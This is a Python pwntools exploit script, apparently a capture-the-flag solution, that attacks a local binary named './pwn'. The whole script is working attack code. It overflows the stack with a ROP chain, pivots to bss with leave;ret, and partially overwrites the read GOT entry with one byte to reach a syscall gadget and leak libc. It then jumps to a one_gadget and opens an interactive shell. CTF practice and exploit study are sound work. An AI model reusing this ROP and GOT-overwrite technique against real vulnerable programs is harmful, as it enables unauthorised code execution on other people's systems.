#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn')
elf = ELF('./pwn')
'''
- stack : read() -> RBP \ read(bss) \ leave_ret 
- bss   : write(read) \ read(bss) \ 
- get shell
'''

'''
.text:00000000000F7310                 cmp     cs:dword_3C9740, 0
.text:00000000000F7317                 jnz     short loc_F7329
.text:00000000000F7319                 mov     eax, 0
.text:00000000000F731E                 syscall                 ; LINUX - sys_read
.text:00000000000F7320                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:00000000000F7326                 jnb     short loc_F7359
.text:00000000000F7328                 retn
'''

syscall = '\x1E'
bss = 0x601100
start = 0x4005DD
read_addr = 0x4005CB
leave_ret = 0x00000000004005db
pop_rdi_ret = 0x0000000000400693
pop_rsi_ret = 0x0000000000400691
if __name__ == "__main__":
  # gdb.attach(p, 'b *0x0000000000400691\n')
  payload = 'a' * 0xa
  payload += p64(bss) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(elf.got['read']) + p64(0) + p64(elf.plt['read'])
  payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(elf.got['read']) + p64(0) + p64(elf.plt['read'])
  payload += p64(pop_rsi_ret) + p64(bss) + p64(0) + p64(read_addr)
  p.send(payload.ljust(0xaa, 'a'))


  p.send(syscall)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0xF731E 
  success("LIBC: " + str(hex(libc)))

  og = [0x45226, 0x4527a, 0xf0364, 0xf1207]
  payload = p64(0) + p64(libc + og[1])
  p.sendline(payload)
  
  p.interactive()